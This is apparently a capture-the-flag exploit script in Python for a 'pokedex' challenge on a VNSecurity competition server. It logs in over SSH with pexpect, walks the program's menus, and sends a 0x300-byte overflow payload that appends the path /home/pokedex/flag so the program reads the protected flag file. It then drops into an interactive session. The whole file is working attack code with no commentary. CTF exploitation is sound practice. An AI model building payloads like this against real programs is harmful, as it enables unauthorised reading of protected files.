import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib
from pexpect import spawn
import time
import subprocess,sys


child = spawn('ssh pokedex@2015.svattt.vnsecurity.net')
child.expect('\'s password')
child.sendline('pokedex')


child.send('s')
child.send(' ')
child.sendline('123')
child.sendline('123')
child.sendline('123')
child.sendline('123')
child.sendline('123')
child.sendline('123')
child.sendline('123')
child.send('Y')
child.sendline('qwe')
child.sendline('qwe')
child.sendline('qwe')
child.sendline('qwe')
child.sendline('qwe')

child.sendline('5000')
child.sendline('A'*0x300 + "\x00" + "/home/pokedex/flag\x00")
child.send('N')


child.send('sss')
child.send(' ')
child.send('n'*6)
child.setwinsize(1024, 1024)
child.interact()
